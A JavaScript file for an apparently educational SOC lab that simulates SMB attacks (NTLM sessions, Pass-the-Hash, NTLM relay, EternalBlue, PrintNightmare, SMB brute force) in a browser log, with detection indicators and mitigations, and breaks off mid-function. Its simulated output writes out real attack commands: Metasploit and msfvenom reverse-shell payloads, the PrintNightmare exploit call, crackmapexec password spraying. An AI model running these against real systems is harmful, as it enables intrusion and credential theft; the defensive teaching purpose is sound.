/* ============================================================
   smb/app.js — Demo Lab: SMB
   Protocolos Red SOC · @xavimape
   Demos: 1) Sesión SMB con autenticación NTLM
          2) Pass-the-Hash
          3) SMB Relay (NTLM Relay)
   ============================================================ */

'use strict';

const smbDemo = (function () {
  function createLogger(id) { const el=document.getElementById(id); return el ? SOC.createLogger(el) : { log: async()=>{}, clear:()=>{} }; }
  const rand    = SOC.rand;

  const t = (es, en) => (typeof i18n !== 'undefined' && i18n.getLang() === 'en') ? en : es;
  const randHex  = SOC.randHex;




  // ─── Demo 1: Sesión SMB / NTLM Auth ──────────────────────────

  async function runSession() {
    const client = document.getElementById('smb-client').value.trim()  || '192.168.1.50';
    const server = document.getElementById('smb-server').value.trim()  || '192.168.1.10';
    const share  = document.getElementById('smb-share').value;
    const ver    = document.getElementById('smb-ver').value;
    const out    = document.getElementById('smb-output');
    out.innerHTML = '';
    const L = SOC.createLogger(out);

    const challenge = randHex(16).toUpperCase();
    const sessionId = randHex(16).toUpperCase();
    const ntHash    = randHex(32).toUpperCase();
    const response  = randHex(48).toUpperCase();
    const verLabel  = ver === '1' ? 'SMBv1 (VULNERABLE — MS17-010)' : ver === '2' ? 'SMBv2' : 'SMBv3 (cifrado)';
    const signing   = ver === '3' ? 'Required' : ver === '2' ? 'Enabled (not required)' : 'Disabled';

    if (ver === '1') {
      await L.log(t(`⚠️  SMBv1 SELECCIONADO — PROTOCOLO VULNERABLE`, `⚠️  SMBv1 SELECTED — VULNERABLE PROTOCOL`), 'danger', 0);
      await L.log(t(`   CVE-2017-0144 (EternalBlue) — ejecución remota sin auth`, `   CVE-2017-0144 (EternalBlue) — remote code execution without auth`), 'danger', 100);
      await L.log(t(`   ACCIÓN: deshabilitar con Set-SmbServerConfiguration -EnableSMB1Protocol $false`, `   ACTION: disable with Set-SmbServerConfiguration -EnableSMB1Protocol $false`), 'warning', 100);
      await L.log('', 'muted', 300);
    }

    await L.log(t(`── Sesión SMB: ${client} → \\\\${server}\\${share} ─────────────`, `── SMB session: ${client} → \\\\${server}\\${share} ──────────────`), 'info', 0);
    await L.log(t(`   Versión negociada: ${verLabel}`, `   Negotiated version: ${verLabel}`), ver === '1' ? 'danger' : 'muted', 100);
    await L.log(t(`   SMB Signing: ${signing}${signing === 'Enabled (not required)' ? ' ← vulnerable a relay' : ''}`, `   SMB Signing: ${signing}${signing === 'Enabled (not required)' ? ' ← vulnerable to relay' : ''}`), signing !== 'Required' ? 'warning' : 'success', 100);
    await L.log('', 'muted', 300);

    // TCP + Negotiate
    await L.log(`[1] TCP Connect → ${server}:445`, 'info', 0);
    await L.log(t(`   SYN → SYN-ACK → ACK (3-way handshake completado)`, `   SYN → SYN-ACK → ACK (3-way handshake completed)`), 'muted', 200);
    await L.log('', 'muted', 200);

    await L.log(`[2] SMB_COM_NEGOTIATE`, 'info', 0);
    await L.log(`   ${client} → ${server}:445`, 'muted', 100);
    await L.log(`   Dialectos propuestos: PC NETWORK PROGRAM 1.0, SMB 2.002, SMB 2.???`, 'muted', 100);
    await L.log(t(`   ${server} selecciona: ${verLabel}`, `   ${server} selects: ${verLabel}`), ver === '1' ? 'danger' : 'success', 200);
    await L.log('', 'muted', 300);

    // NTLM Auth
    await L.log(`[3] SESSION_SETUP — NTLM Negotiate`, 'warning', 0);
    await L.log(`   ${client} → NTLMSSP_NEGOTIATE (flags: NTLM v2, extended security)`, 'muted', 200);
    await L.log('', 'muted', 200);

    await L.log(`[4] SESSION_SETUP — NTLM Challenge`, 'warning', 0);
    await L.log(t(`   ${server} → Challenge = 0x${challenge}  (8 bytes aleatorios)`, `   ${server} → Challenge = 0x${challenge}  (8 random bytes)`), 'muted', 200);
    await L.log(t(`   ⚠ El cliente debe responder usando su hash NTLM + este challenge`, `   ⚠ The client must respond using its NTLM hash + this challenge`), 'warning', 100);
    await L.log('', 'muted', 300);

    await L.log(`[5] SESSION_SETUP — NTLM Authenticate`, 'warning', 0);
    await L.log(`   ${client} → NTLMSSP_AUTH`, 'muted', 100);
    await L.log(t(`   NTHash  = MD4(contraseña)  = 0x${ntHash.substring(0,32)}`, `   NTHash  = MD4(password)  = 0x${ntHash.substring(0,32)}`), 'danger', 100);
    await L.log(t(`   Response = HMAC-MD5(NTHash, Challenge+contexto) = 0x${response.substring(0,32)}...`, `   Response = HMAC-MD5(NTHash, Challenge+context) = 0x${response.substring(0,32)}...`), 'muted', 100);
    await L.log(t(`   Usuario = CORP\\jperez  Dominio = CORP`, `   User = CORP\\jperez  Domain = CORP`), 'muted', 100);
    await L.log(t(`   ⚡ El NTHash viaja IMPLÍCITO en el Response — si lo robás, podés autenticarte`, `   ⚡ The NTHash travels IMPLICITLY in the Response — if you steal it, you can authenticate`), 'danger', 200);
    await L.log('', 'muted', 300);

    await L.log(`[6] STATUS_SUCCESS → SessionID = 0x${sessionId}`, 'success', 0);
    await L.log('', 'muted', 200);

    // Tree connect
    await L.log(`[7] TREE_CONNECT → \\\\${server}\\${share}`, 'info', 0);
    const treeType = share === 'C$' || share === 'ADMIN$' ? t('Admin share — solo BUILTIN\\Administrators','Admin share — only BUILTIN\\Administrators') :
                     share === 'IPC$' ? t('Named pipes — enumeración RPC','Named pipes — RPC enumeration') :
                     share === 'SYSVOL' || share === 'NETLOGON' ? t('Domain share — accesible por usuarios de dominio','Domain share — accessible by domain users') : 'Custom share';
    await L.log(`   Tipo: ${treeType}`, share.endsWith('$') ? 'warning' : 'muted', 100);

    if (share === 'SYSVOL') {
      await L.log(t(`   ⚠ SYSVOL es legible por TODOS los usuarios de dominio`, `   ⚠ SYSVOL is readable by ALL domain users`), 'warning', 100);
      await L.log(t(`   Buscar: \\\\${server}\\SYSVOL\\*\\Policies\\*\\Groups.xml (cpassword)`, `   Search: \\\\${server}\\SYSVOL\\*\\Policies\\*\\Groups.xml (cpassword)`), 'danger', 100);
    } else if (share === 'C$') {
      await L.log(t(`   ⚠ C$ permite acceso al disco completo — IOC si el origen no es admin`, `   ⚠ C$ grants full disk access — IOC if the source is not admin`), 'danger', 100);
    }

    await L.log(t(`   TreeID asignado → acceso confirmado a \\\\${server}\\${share}`, `   TreeID assigned → access confirmed to \\\\${server}\\${share}`), 'success', 200);
    await L.log('', 'muted', 100);
    await L.log(`Zeek smb_cmd.log: ${client} → ${server} TREE_CONNECT \\\\${server}\\${share}`, 'muted', 0);
    if (ver === '2' || ver === '1') {
      await L.log(t(`⚠ SMB Signing no requerido → este tráfico puede ser interceptado para relay`, `⚠ SMB Signing not required → this traffic can be intercepted for relay`), 'warning', 100);
    }
  }

  // ─── Demo 2: Pass-the-Hash ────────────────────────────────────

  async function runPTH() {
    const user   = document.getElementById('pth-user').value.trim()   || 'jperez';
    const hash   = document.getElementById('pth-hash').value.trim()   || 'aad3b435b51404eeaad3b435b51404ee';
    const target = document.getElementById('pth-target').value.trim() || '192.168.1.10';
    const out    = document.getElementById('pth-output');
    out.innerHTML = '';
    const L = SOC.createLogger(out);

    const challenge  = randHex(16).toUpperCase();
    const response   = randHex(48).toUpperCase();
    const isEmptyHash = hash === 'aad3b435b51404eeaad3b435b51404ee';

    await L.log(`── Pass-the-Hash → ${target} ─────────────────────────────`, 'danger', 0);
    await L.log(t(`   Usuario: ${user}`, `   User: ${user}`), 'muted', 100);
    await L.log(t(`   NTHash:  ${hash}${isEmptyHash ? '  ← hash de contraseña VACÍA' : ''}`, `   NTHash:  ${hash}${isEmptyHash ? '  ← EMPTY password hash' : ''}`), 'danger', 100);
    await L.log(t(`   Herramienta: impacket smbclient.py / psexec.py`, `   Tool: impacket smbclient.py / psexec.py`), 'muted', 100);
    await L.log(t(`   Contraseña real: DESCONOCIDA — no necesaria`, `   Real password: UNKNOWN — not needed`), 'warning', 100);
    await L.log('', 'muted', 300);

    await L.log(t(`── Flujo NTLM con hash robado ────────────────────────────`, `── NTLM flow with stolen hash ────────────────────────────`), 'muted', 0);
    await L.log('', 'muted', 200);

    await L.log(t(`[1] Conexión SMB: atacante → ${target}:445`, `[1] SMB connection: attacker → ${target}:445`), 'info', 100);
    await L.log(t(`[2] Negotiate → ${target} envía Challenge = 0x${challenge}`, `[2] Negotiate → ${target} sends Challenge = 0x${challenge}`), 'muted', 200);
    await L.log(t(`[3] Atacante calcula Response usando el HASH (sin contraseña):`, `[3] Attacker computes Response using the HASH (no password):`), 'warning', 200);
    await L.log(`    Response = HMAC-MD5(${hash.substring(0,16)}..., 0x${challenge})`, 'muted', 100);
    await L.log(`    Response = 0x${response.substring(0,32)}...`, 'muted', 100);
    await L.log(t(`[4] SESSION_SETUP_AUTH enviado con:`, `[4] SESSION_SETUP_AUTH sent with:`), 'warning', 200);
    await L.log(`    Username=${user}  NtChallengeResponse=${response.substring(0,20)}...`, 'muted', 100);
    await L.log('', 'muted', 200);

    await L.log(t(`[5] ${target} verifica: computa HMAC-MD5(NTHash_almacenado, Challenge)`, `[5] ${target} verifies: computes HMAC-MD5(stored_NTHash, Challenge)`), 'muted', 100);
    await L.log(t(`    ¿Coincide? SÍ (el hash era correcto)`, `    Match? YES (the hash was correct)`), 'success', 200);
    await L.log('', 'muted', 200);

    await L.log(t(`✓ AUTENTICADO como ${user} en ${target} — SIN conocer la contraseña`, `✓ AUTHENTICATED as ${user} on ${target} — WITHOUT knowing the password`), 'danger', 0);
    await L.log('', 'muted', 200);
    await L.log(t(`── Acciones posibles post-auth ──────────────────────────`, `── Possible post-auth actions ───────────────────────────`), 'danger', 0);
    await L.log(t(`   smbclient → leer/escribir archivos en shares`, `   smbclient → read/write files on shares`), 'danger', 200);
    await L.log(t(`   psexec.py → shell remota como SYSTEM (si usuario es admin)`, `   psexec.py → remote shell as SYSTEM (if user is admin)`), 'danger', 100);
    await L.log(t(`   secretsdump.py → extraer hashes de otros usuarios`, `   secretsdump.py → extract other users' hashes`), 'danger', 100);
    await L.log(t(`   wmiexec.py → ejecución remota via WMI`, `   wmiexec.py → remote execution via WMI`), 'danger', 100);
    await L.log('', 'muted', 200);
    await L.log(t(`── IOC en Windows Event Log ─────────────────────────────`, `── IOC in Windows Event Log ─────────────────────────────`), 'muted', 0);
    await L.log(t(`   Event 4624 LogonType=3 AuthPkg=NTLM (en dominio = sospechoso)`, `   Event 4624 LogonType=3 AuthPkg=NTLM (in a domain = suspicious)`), 'warning', 100);
    await L.log(t(`   Event 4648 "logon with explicit credentials" desde origen atípico`, `   Event 4648 "logon with explicit credentials" from atypical source`), 'warning', 100);
    await L.log(t(`   Event 4625 × N antes del 4624 exitoso = brute/PtH pattern`, `   Event 4625 × N before a successful 4624 = brute/PtH pattern`), 'warning', 100);
    await L.log('', 'muted', 100);
    await L.log(t(`── Mitigación ───────────────────────────────────────────`, `── Mitigation ───────────────────────────────────────────`), 'muted', 0);
    await L.log(t(`   Protected Users group → fuerza Kerberos, bloquea NTLM para esa cuenta`, `   Protected Users group → forces Kerberos, blocks NTLM for that account`), 'success', 200);
    await L.log(t(`   Credential Guard → protege hashes en memoria (LSASS protegido)`, `   Credential Guard → protects hashes in memory (LSASS protected)`), 'success', 100);
    await L.log(t(`   LAPS → hash diferente por equipo → PtH no se propaga`, `   LAPS → different hash per machine → PtH does not spread`), 'success', 100);
  }

  // ─── Demo 3: SMB Relay ────────────────────────────────────────

  async function runRelay() {
    const victim   = document.getElementById('relay-victim').value.trim()   || '192.168.1.50';
    const attacker = document.getElementById('relay-attacker').value.trim() || '192.168.1.99';
    const target   = document.getElementById('relay-target').value.trim()   || '192.168.1.10';
    const out      = document.getElementById('relay-output');
    out.innerHTML = '';
    const L = SOC.createLogger(out);

    const challenge  = randHex(16).toUpperCase();
    const response   = randHex(48).toUpperCase();
    const llmnrName  = 'FILESERVER';

    await L.log(`── SMB Relay (NTLM Relay) ────────────────────────────────`, 'danger', 0);
    await L.log(t(`   Víctima:   ${victim}`, `   Victim:   ${victim}`), 'muted', 100);
    await L.log(`   Atacante:  ${attacker}  (Responder + ntlmrelayx)`, 'muted', 100);
    await L.log(t(`   Target:    ${target}  (servidor a comprometer)`, `   Target:    ${target}  (server to compromise)`), 'muted', 100);
    await L.log(t(`   Requisito: SMB Signing NO requerido en ${target}`, `   Requirement: SMB Signing NOT required on ${target}`), 'warning', 100);
    await L.log('', 'muted', 300);

    await L.log(t(`── Fase 1: Envenenamiento LLMNR/NBT-NS ──────────────────`, `── Phase 1: LLMNR/NBT-NS poisoning ──────────────────────`), 'warning', 0);
    await L.log(t(`[1] ${victim} busca: "¿Quién es \\\\${llmnrName}?" (LLMNR broadcast)`, `[1] ${victim} asks: "Who is \\\\${llmnrName}?" (LLMNR broadcast)`), 'info', 300);
    await L.log(t(`[2] ${attacker} (Responder): "Soy yo — ${attacker}" (respuesta FALSA)`, `[2] ${attacker} (Responder): "That is me — ${attacker}" (FAKE reply)`), 'danger', 400);
    await L.log(t(`    ${victim} cree que \\\\${llmnrName} = ${attacker}`, `    ${victim} believes \\\\${llmnrName} = ${attacker}`), 'danger', 100);
    await L.log('', 'muted', 400);

    await L.log(t(`── Fase 2: Interceptar la autenticación SMB ─────────────`, `── Phase 2: Intercept the SMB authentication ────────────`), 'warning', 0);
    await L.log(`[3] ${victim} → SMB NEGOTIATE → ${attacker}`, 'muted', 300);
    await L.log(`[4] ${attacker} → SMB NEGOTIATE → ${target}  (forwarded)`, 'muted', 200);
    await L.log(`[5] ${target} → Challenge = 0x${challenge} → ${attacker}`, 'muted', 200);
    await L.log(t(`[6] ${attacker} → Challenge = 0x${challenge} → ${victim}  (mismo challenge)`, `[6] ${attacker} → Challenge = 0x${challenge} → ${victim}  (same challenge)`), 'warning', 200);
    await L.log('', 'muted', 200);

    await L.log(t(`── Fase 3: Relay del Response ───────────────────────────`, `── Phase 3: Relay the Response ──────────────────────────`), 'danger', 0);
    await L.log(t(`[7] ${victim} computa Response usando su NTHash + Challenge`, `[7] ${victim} computes Response using its NTHash + Challenge`), 'muted', 300);
    await L.log(t(`    Response = HMAC-MD5(NTHash_víctima, 0x${challenge})`, `    Response = HMAC-MD5(victim_NTHash, 0x${challenge})`), 'muted', 100);
    await L.log(`    Response = 0x${response.substring(0,32)}...`, 'muted', 100);
    await L.log(`[8] ${victim} → SESSION_SETUP_AUTH → ${attacker}`, 'muted', 200);
    await L.log(t(`[9] ${attacker} → SESSION_SETUP_AUTH → ${target}  (response reenviado)`, `[9] ${attacker} → SESSION_SETUP_AUTH → ${target}  (response forwarded)`), 'danger', 200);
    await L.log('', 'muted', 200);

    await L.log(t(`[10] ${target} verifica el Response → STATUS_SUCCESS`, `[10] ${target} verifies the Response → STATUS_SUCCESS`), 'danger', 0);
    await L.log(t(`    ✓ ${attacker} queda autenticado en ${target} como la víctima`, `    ✓ ${attacker} is now authenticated on ${target} as the victim`), 'danger', 100);
    await L.log(t(`    ✗ ${victim} también queda "autenticado" en ${attacker} (pero conectado a nada útil)`, `    ✗ ${victim} is also "authenticated" on ${attacker} (but connected to nothing useful)`), 'muted', 100);
    await L.log('', 'muted', 300);

    await L.log(t(`── Fase 4: Explotación post-relay ──────────────────────`, `── Phase 4: Post-relay exploitation ─────────────────────`), 'danger', 0);
    await L.log(t(`    ntlmrelayx → ejecuta secretsdump en ${target}`, `    ntlmrelayx → runs secretsdump on ${target}`), 'danger', 200);
    await L.log(t(`    ntlmrelayx → crea usuario backdoor admin en ${target}`, `    ntlmrelayx → creates backdoor admin user on ${target}`), 'danger', 100);
    await L.log(t(`    ntlmrelayx → descarga NTDS.dit si ${target} es un DC`, `    ntlmrelayx → downloads NTDS.dit if ${target} is a DC`), 'danger', 100);
    await L.log('', 'muted', 300);
    await L.log(t(`── Mitigación ───────────────────────────────────────────`, `── Mitigation ───────────────────────────────────────────`), 'muted', 0);
    await L.log(t(`   SMB Signing REQUERIDO → el relay falla (sin SessionKey → sin firma)`, `   SMB Signing REQUIRED → relay fails (no SessionKey → no signature)`), 'success', 200);
    await L.log(t(`   Deshabilitar LLMNR → sin envenenamiento = sin relay forzado`, `   Disable LLMNR → no poisoning = no forced relay`), 'success', 100);
    await L.log(`   Set-SmbServerConfiguration -RequireSecuritySignature $true`, 'success', 100);
  }

  // ─── Reset ────────────────────────────────────────────────────

  function reset() {
    ['smb-output','pth-output','relay-output'].forEach(id => {
      const el = document.getElementById(id);
      if (el) el.innerHTML = '<div class="log-line"><span class="log-time">[→]</span><span class="log-info">Esperando simulación SMB...</span></div>';
    });
    document.getElementById('smb-client').value = '192.168.1.50';
    document.getElementById('smb-server').value = '192.168.1.10';
    document.getElementById('smb-ver').value    = '2';
  }


  async function runEternalBlue() {
    const target  = document.getElementById('eternal-target').value.trim() || '192.168.1.100';
    const os      = document.getElementById('eternal-os').value;
    const payload = document.getElementById('eternal-payload').value;
    const L = createLogger('eternal-output');
    L.clear();

    await L.log('=== ETERNALBLUE (MS17-010) SIMULATION ===', 'header', 0);
    await L.log(t(`Objetivo: ${target}:445`, `Target: ${target}:445`), 'info', 100);
    await L.log('', 'info', 100);

    // Phase 1: Recon
    await L.log(t('[ FASE 1: RECONOCIMIENTO ]', '[ PHASE 1: RECONNAISSANCE ]'), 'header', 200);
    await L.log(`nmap -p 445 --script smb-vuln-ms17-010 ${target}`, 'code', 300);
    await L.log('', 'info', 200);
    await L.log(`PORT    STATE  SERVICE`, 'recv', 300);
    await L.log(`445/tcp open   microsoft-ds`, 'recv', 300);
    await L.log('', 'info', 100);

    if (os === 'patched') {
      await L.log('| smb-vuln-ms17-010:', 'recv', 300);
      await L.log('|   NOT VULNERABLE', 'recv', 300);
      await L.log('|_  SMB: Server patched (KB4012212 detected)', 'recv', 300);
      await L.log('', 'info', 100);
      await L.log(t('Sistema PARCHEADO — MS17-010 no aplicable', 'System PATCHED — MS17-010 not applicable'), 'warn', 300);
      await L.log(t('El parche KB4012212 fue publicado el 14/03/2017', 'The KB4012212 patch was released on 2017-03-14'), 'info', 200);
      await L.log(t('WannaCry se publicó el 12/05/2017 — 59 dias despues del parche', 'WannaCry was released on 2017-05-12 — 59 days after the patch'), 'warn', 200);
      await L.log(t('Sistemas infectados tenian el parche disponible pero no aplicado', 'Infected systems had the patch available but not applied'), 'danger', 300);
      return;
    }

    const osNames = { xp: 'Windows XP SP3', '7': 'Windows 7 SP1', '2008': 'Windows Server 2008 R2' };
    await L.log(`| smb-vuln-ms17-010:`, 'recv', 300);
    await L.log(`|   VULNERABLE`, 'attack', 300);
    await L.log(`|   Risk factor: HIGH`, 'attack', 300);
    await L.log(`|   CVE:2017-0144`, 'attack', 300);
    await L.log(t(`|_  ${osNames[os]} — SMBv1 sin parche`, `|_  ${osNames[os]} — unpatched SMBv1`), 'attack', 300);
    await L.log('', 'info', 100);

    // Phase 2: Exploit
    await L.log(t('[ FASE 2: EXPLOIT — EternalBlue ]', '[ PHASE 2: EXPLOIT — EternalBlue ]'), 'header', 200);
    await L.log(t('Herramienta: Metasploit Framework', 'Tool: Metasploit Framework'), 'code', 200);
    await L.log('msf6 > use exploit/windows/smb/ms17_010_eternalblue', 'code', 300);
    await L.log(`msf6 exploit > set RHOSTS ${target}`, 'code', 200);
    await L.log(`msf6 exploit > set LHOST 10.0.0.99`, 'code', 200);
    await L.log('msf6 exploit > run', 'code', 300);
    await L.log('', 'info', 200);
    await L.log('[*] Started reverse TCP handler on 10.0.0.99:4444', 'info', 300);
    await L.log(`[*] ${target}:445 - Connecting to target for exploitation.`, 'info', 400);
    await L.log(`[+] ${target}:445 - Connection established for exploitation.`, 'recv', 400);
    await L.log(`[*] ${target}:445 - Sending SMBv1 exploit...`, 'warn', 500);
    await L.log(`[+] ${target}:445 - =-=-=-=-=-=-= ETERNALBLUE =-=-=-=-=-=-=`, 'attack', 600);
    await L.log(`[+] ${target}:445 - =-=-=-=-=-=-= SMILE2U     =-=-=-=-=-=-=`, 'attack', 300);
    await L.log(`[+] ${target}:445 - =-=-=-=-=-=-= ETERNALBLUE =-=-=-=-=-=-=`, 'attack', 300);
    await L.log(`[*] ${target}:445 - Triggering free of smb_com_transaction2...`, 'warn', 500);
    await L.log(`[*] ${target}:445 - Sending WriteAndX request...`, 'warn', 400);
    await L.log(`[*] ${target}:445 - Sending Transaction2 request...`, 'warn', 400);
    await L.log(`[+] ${target}:445 - Shellcode injection successful.`, 'attack', 600);
    await L.log('', 'info', 200);

    // Phase 3: Payload
    const payloadNames = {
      meterpreter: 'windows/x64/meterpreter/reverse_tcp',
      ransomware:  'WannaCry dropper (wncry encryptor)',
      mimikatz:    'Invoke-Mimikatz (credential dump)'
    };
    await L.log(t('[ FASE 3: PAYLOAD ]', '[ PHASE 3: PAYLOAD ]'), 'header', 200);
    await L.log(`Payload: ${payloadNames[payload]}`, 'warn', 200);

    if (payload === 'meterpreter') {
      await L.log(`[*] Sending stage to ${target}...`, 'info', 400);
      await L.log(`[+] Meterpreter session 1 opened (10.0.0.99:4444 -> ${target}:49158)`, 'attack', 500);
      await L.log('', 'info', 100);
      await L.log('meterpreter > getuid', 'code', 200);
      await L.log('Server username: NT AUTHORITY\SYSTEM', 'attack', 300);
      await L.log('meterpreter > sysinfo', 'code', 200);
      await L.log(`Computer        : WIN7-TARGET`, 'recv', 200);
      await L.log(`OS              : ${osNames[os]}`, 'recv', 200);
      await L.log(`Architecture    : x64`, 'recv', 200);
    } else if (payload === 'ransomware') {
      await L.log('[*] Dropping WannaCry components...', 'attack', 400);
      await L.log(t('[+] mssecsvc.exe instalado como servicio', '[+] mssecsvc.exe installed as a service'), 'attack', 300);
      await L.log(t('[*] Escaneando red interna en busca de más SMBv1...', '[*] Scanning internal network for more SMBv1...'), 'warn', 400);
      await L.log(t('[+] Propagacion a: 192.168.1.101, .102, .103, .105 (SMBv1 detectado)', '[+] Propagation to: 192.168.1.101, .102, .103, .105 (SMBv1 detected)'), 'attack', 500);
      await L.log(t('[*] Iniciando cifrado AES-128 de archivos...', '[*] Starting AES-128 file encryption...'), 'danger', 400);
      await L.log(t('[+] 47.823 archivos cifrados (.doc, .xls, .pdf, .db)', '[+] 47,823 files encrypted (.doc, .xls, .pdf, .db)'), 'danger', 400);
      await L.log(t('[!] @Please_Read_Me@.txt creado en todos los directorios', '[!] @Please_Read_Me@.txt created in every directory'), 'danger', 300);
    } else {
      await L.log(t('[*] Cargando Mimikatz en memoria...', '[*] Loading Mimikatz into memory...'), 'warn', 400);
      await L.log(t('[+] Credenciales extraidas de LSASS:', '[+] Credentials extracted from LSASS:'), 'attack', 400);
      await L.log('  [*] Username: Administrador  Hash: 31d6cfe0d16ae931b73c59d7e0c089c0', 'attack', 300);
      await L.log('  [*] Username: jdoe           Hash: e10adc3949ba59abbe56e057f20f883e', 'attack', 300);
      await L.log('  [*] Username: svcSQL          Pass: SQL$erv1ce2022!', 'attack', 300);
    }

    await L.log('', 'info', 200);
    await L.log('[ IOC — ZEEK smb.log durante el ataque ]', 'header', 200);
    await L.log(`ts        id.orig_h   id.resp_h  version  command  status`, 'code', 200);
    await L.log(`...       10.0.0.99   ${target}  SMB1     Trans2   SUCCESS`, 'attack', 200);
    await L.log(t('DETECCION: SMBv1 + Trans2 request + shellcode pattern', 'DETECTION: SMBv1 + Trans2 request + shellcode pattern'), 'warn', 200);
    await L.log('Snort/Suricata: ET EXPLOIT EternalBlue MS17-010 (SID:2024217)', 'info', 200);
    await L.log('', 'info', 100);
    await L.log(t('MITIGACION INMEDIATA: deshabilitar SMBv1 + aplicar KB4012212', 'IMMEDIATE MITIGATION: disable SMBv1 + apply KB4012212'), 'warn', 300);
  }


  function resetPrint() { const el=document.getElementById('print-output'); if(el) el.innerHTML=''; }
  function resetBrute() { const el=document.getElementById('smb-brute-output'); if(el) el.innerHTML=''; }

  async function runPrintNightmare() {
    const target  = document.getElementById('print-target').value.trim() || '10.0.0.50';
    const variant = document.getElementById('print-variant').value;
    const L = createLogger('print-output');
    L.clear();

    await L.log('=== PRINTNIGHTMARE EXPLOIT ===', 'header', 0);
    await L.log(`Target: ${target}  (Windows Print Spooler)`, 'warn', 100);
    await L.log(t(`Variante: ${variant === 'rce' ? 'CVE-2021-1675 (RCE remoto)' : variant === 'lpe' ? 'CVE-2021-34527 (LPE local)' : 'Sistema parcheado'}`, `Variant: ${variant === 'rce' ? 'CVE-2021-1675 (remote RCE)' : variant === 'lpe' ? 'CVE-2021-34527 (local LPE)' : 'Patched system'}`), 'info', 100);
    await L.log('', 'info', 50);

    if (variant === 'patched') {
      await L.log(t('[ VERIFICACIÓN ]', '[ VERIFICATION ]'), 'header', 200);
      await L.log(`rpcdump.py @${target} | grep -i spooler`, 'code', 300);
      await L.log(t('[-] MS-RPRN Print Spooler: DESHABILITADO o parcheado', '[-] MS-RPRN Print Spooler: DISABLED or patched'), 'warn', 400);
      await L.log(t('[-] KB5004945 instalado — CVE-2021-34527 mitigado', '[-] KB5004945 installed — CVE-2021-34527 mitigated'), 'warn', 300);
      await L.log(t('[*] Sistema no vulnerable a PrintNightmare', '[*] System not vulnerable to PrintNightmare'), 'recv', 300);
      return;
    }

    await L.log(t('[ PASO 1: Verificar Print Spooler activo ]', '[ STEP 1: Verify Print Spooler active ]'), 'header', 200);
    await L.log(`rpcdump.py @${target} | grep -i spooler`, 'code', 300);
    await L.log('[*] Protocol: [MS-RPRN]: Print System Remote Protocol', 'recv', 300);
    await L.log(t('[+] Print Spooler activo — objetivo vulnerable', '[+] Print Spooler active — target vulnerable'), 'attack', 300);
    await L.log('', 'info', 50);

    await L.log(t('[ PASO 2: Preparar DLL maliciosa ]', '[ STEP 2: Prepare malicious DLL ]'), 'header', 200);
    await L.log('msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f dll > evil.dll', 'code', 300);
    await L.log('impacket-smbserver share . -smb2support', 'code', 200);
    await L.log('[*] DLL servida en \\\\10.0.0.1\\share\\evil.dll', 'info', 200);
    await L.log('', 'info', 50);

    await L.log(t('[ PASO 3: Ejecutar PrintNightmare ]', '[ STEP 3: Run PrintNightmare ]'), 'header', 200);
    await L.log(`python3 CVE-2021-1675.py 'DOMAIN/user:pass'@${target} '\\\\\\\\10.0.0.1\\\\share\\\\evil.dll'`, 'code', 300);
    await L.log('[*] Triggering PrintNightmare via MS-RPRN...', 'warn', 300);
    await L.log('[*] RpcAddPrinterDriverEx() called...', 'warn', 300);
    await L.log('[+] Printer Driver installed successfully!', 'attack', 400);
    await L.log(t('[*] DLL cargada por spoolsv.exe (SYSTEM)', '[*] DLL loaded by spoolsv.exe (SYSTEM)'), 'attack', 300);
    await L.log('', 'info', 50);

    await L.log(t('[ PASO 4: Shell SYSTEM recibida ]', '[ STEP 4: SYSTEM shell received ]'), 'header', 200);
    await L.log('[*] Meterpreter session 1 opened (10.0.0.1:4444)', 'recv', 300);
    await L.log('meterpreter > getuid', 'code', 200);
    await L.log('Server username: NT AUTHORITY\\SYSTEM', 'danger', 400);
    await L.log('meterpreter > hashdump', 'code', 200);
    const hash = () => Array.from({length:32},()=>'0123456789abcdef'[Math.floor(Math.random()*16)]).join('');
    await L.log(`Administrator:500:${hash()}:${hash()}:::`, 'attack', 300);
    await L.log(`Guest:501:${hash()}:${hash()}:::`, 'recv', 200);
    await L.log('', 'info', 50);
    await L.log('MITRE: T1068 — Exploitation for Privilege Escalation', 'info', 200);
  }

  async function runBrute() {
    const target = document.getElementById('smb-brute-target').value.trim() || '10.0.0.10';
    const mode   = document.getElementById('smb-brute-mode').value;
    const modeLabels = {
      user_enum: t('Enumeración de usuarios','User enumeration'),
      password_spray: 'Password Spraying',
      credential_stuffing: 'Credential Stuffing',
    };
    const L = createLogger('smb-brute-output');
    L.clear();

    const users = ['administrator','admin','user1','john.smith','mary.jones','svc_backup','helpdesk','jdoe','asmith'];
    const passwords = ['Password123!','Welcome2024!','Company2024','Summer2024!','P@ssword1'];

    await L.log('=== SMB BRUTE FORCE ===', 'header', 0);
    await L.log(`Target: ${target}:445 (SMB)`, 'warn', 100);
    await L.log(t(`Modo: ${modeLabels[mode] || mode}`, `Mode: ${modeLabels[mode] || mode}`), 'info', 100);
    await L.log('', 'info', 50);

    if (mode === 'user_enum') {
      await L.log(t('[ ENUMERACIÓN DE USUARIOS ]', '[ USER ENUMERATION ]'), 'header', 200);
      await L.log(`crackmapexec smb ${target} --users`, 'code', 300);
      await L.log('', 'info', 50);
      for (const u of users) {
        await L.log(`[*] ${target}\\${u}`, 'recv', rand(80,150));
      }
      await L.log('', 'info', 50);
      await L.log(t(`[+] ${users.length} usuarios enumerados`, `[+] ${users.length} users enumerated`), 'attack', 300);
      await L.log(t('→ Usar lista para password spraying', '→ Use the list for password spraying'), 'warn', 200);
    } else if (mode === 'password_spray') {
      await L.log('[ PASSWORD SPRAYING ]', 'header', 200);
      await L.log(t('Estrategia: 1 password × N usuarios → evitar lockout', 'Strategy: 1 password × N users → avoid lockout'), 'info', 200);
      const pwd = passwords[rand(0,passwords.length-1)];
      await L.log(`crackmapexec smb ${target} -u users.txt -p "${pwd}" --continue-on-success`, 'code', 300);
      await L.log('', 'info', 50);
      const winner = users[rand(0,users.length-1)];
      for (const u of users) {
        if (u === winner) {
          await L.log(`[+] ${target}\\${u}:${pwd} (Pwn3d!)`, 'danger', rand(100,200));
        } else {
          await L.log(`[-] ${target}\\${u}:${pwd}`, 'recv', rand(80,150));
        }
      }
      await L.log('', 'info', 50);
      await L.log(t(`[+] Credencial válida: ${winner} / ${pwd}`, `[+] Valid credential: ${winner} / ${pwd}`), 'attack', 400);
    } else {
      await L.log('[ CREDENTIAL STUFFING ]', 'header', 200);
      await L.log(`crackmapexec smb ${target} -u creds.txt -p creds.txt --no-bruteforce`, 'code', 300);
      await L.log(t('Usando pairs usuario:password de dumps filtrados', 'Using user:password pairs from leaked dumps'), 'warn', 200);
      await L.log('', 'info', 50);
